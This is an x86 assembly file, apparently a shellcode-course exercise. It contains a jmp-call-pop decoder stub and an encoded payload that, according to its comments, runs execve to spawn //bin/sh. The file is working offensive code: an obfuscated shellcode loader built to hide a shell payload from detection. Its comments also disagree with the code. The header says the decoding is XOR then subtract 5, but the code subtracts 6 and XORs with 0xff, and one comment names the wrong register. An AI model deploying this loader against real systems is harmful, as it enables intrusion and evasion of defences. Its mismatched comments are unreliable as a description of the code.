;Author: Will Summerhill
;Insertion Decoder program - decode by XOR each byte then subtract 5
;Uses Jmp-Call-Pop technique 

global _start

section .text
_start:
	jmp short call_decoder
	
decoder:
	pop edi			;pop address of EncodedShellcode into EDI
	xor ecx, ecx
	mov cl, Length		;loop counter - shellcode length is 25
	
	xor edx, edx
	push 6
	pop edx

;XOR decoder loop
xor_decode:
	xor ebx, ebx
	mov bl, byte [edi]	;save current byte from stack into BL	
	
	sub bl, dl		;Decode: subtract 6
	xor bl, 0xff		;Decode: xor BL (EDI) by 0xff

	mov byte [edi], bl	;save value into ESI
	inc edi			;go to next byte
	loop xor_decode		;loop through entire shellcode to XOR every byte by 0xff

	;exit
	jmp short EncodedShellcode	;execute decoded //bin/sh shellcode


call_decoder:
	;push addr of decoder_value onto stack
	call decoder
	EncodedShellcode: db 0xd4,0x45,0xb5,0x9d,0xd6,0xd6,0x92,0x9d,0x9d,0xd6,0xa3,0x9c,0x97,0x7c,0x22,0xb5,0x7c,0x23,0xb2,0x7c,0x24,0x55,0xfa,0x38,0x85

	;; paste encoded shellcode below --> output from A4-encoder.py
	;; shellcode is encoded version of execve-stack which executes //bin/sh
	Length: equ $-EncodedShellcode
  
